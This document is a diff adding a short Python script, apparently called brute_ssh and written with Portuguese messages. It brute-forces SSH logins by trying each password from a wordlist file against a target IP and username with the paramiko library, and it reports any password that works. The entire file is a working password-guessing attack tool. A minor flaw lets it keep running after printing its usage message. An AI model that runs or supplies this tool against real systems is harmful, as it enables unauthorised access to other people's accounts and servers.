@@ -1,0 +1,43 @@
+#!/usr/bin/python
+
+import paramiko
+import sys
+
+if len(sys.argv) != 3:
+
+        print("[+] Modo de uso: brute_ssh <IP> <User>")
+
+
+
+ssh = paramiko.SSHClient()
+ssh.load_system_host_keys()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+
+target = sys.argv[1]
+usuario = sys.argv[2]
+
+f = open('senhas.txt')
+senhas = f.readlines()
+f.close()
+
+total_senhas = len(senhas)
+tentativas = 0
+
+for palavra in senhas:
+    senha = palavra.strip()
+    tentativas += 1
+    sys.stdout.write("\r[+] Progresso: [{}/{}]".format(tentativas, total_senhas))
+    sys.stdout.flush()
+
+    try:
+        ssh.connect(target, username=usuario, password=senha)
+    except paramiko.ssh_exception.AuthenticationException:
+        pass
+    else:
+        print("\n[+] SENHA ENCONTRADA --->", senha)
+        ssh.close()
+        sys.exit(0)
+
+print("\n[!] Senha não encontrada.")
+ssh.close()
